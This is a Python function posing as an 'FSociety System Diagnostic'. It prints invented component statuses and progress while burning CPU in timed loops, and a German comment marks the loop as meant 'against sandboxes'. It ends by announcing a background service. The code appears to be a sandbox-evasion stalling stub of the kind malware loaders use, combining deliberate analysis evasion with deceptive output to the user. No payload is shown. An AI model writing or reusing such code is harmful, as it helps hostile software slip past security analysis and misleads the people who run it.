import time
import math
import platform
import random
import sys

def initial_system_check(duration_seconds):
    print("--- [FSociety System Diagnostic v1.0.0.0] ---")
    print(f"[*] Platform: {platform.system()} {platform.release()}")
    print(f"[*] Machine: {platform.machine()}")
    print("[*] Initializing core modules...")
    
    start_time = time.time()
    checkpoints = [0.2, 0.4, 0.6, 0.8, 0.95] # Prozentsätze für Statusmeldungen
    
    # Fake-Komponenten-Liste für den Debug-Output
    components = [
        "Memory Buffer", "Kernel Hooks", "Thread Scheduler", 
        "I/O Controller", "Registry Hive", "Socket Interface",
        "Encryption Layer", "Hardware Abstraction", "DirectX Shader"
    ]

    while True:
        elapsed = time.time() - start_time
        progress = elapsed / duration_seconds
        
        if elapsed >= duration_seconds:
            break

        # 1. CPU-Arbeit (Wichtig gegen Sandboxen!)
        for _ in range(2000):
            _ = math.sqrt(random.randint(1, 10000)) * math.cos(random.random())

        # 2. Regelmäßiger Debug-Output
        if random.random() < 0.05: # Zufällig alle paar Sekunden eine Meldung
            comp = random.choice(components)
            status = random.choice(["OK", "READY", "OPTIMIZED", "LOADED"])
            print(f"[DEBUG] {comp}: {status}")

        # 3. Fortschrittsanzeige
        if checkpoints and progress >= checkpoints[0]:
            print(f"[PROGRESS] System-Check: {int(progress * 100)}% complete...")
            checkpoints.pop(0)

        time.sleep(random.uniform(0.5, 2.0))

    print("[SUCCESS] All modules initialized. Starting background service...")
    print("--------------------------------------------------")
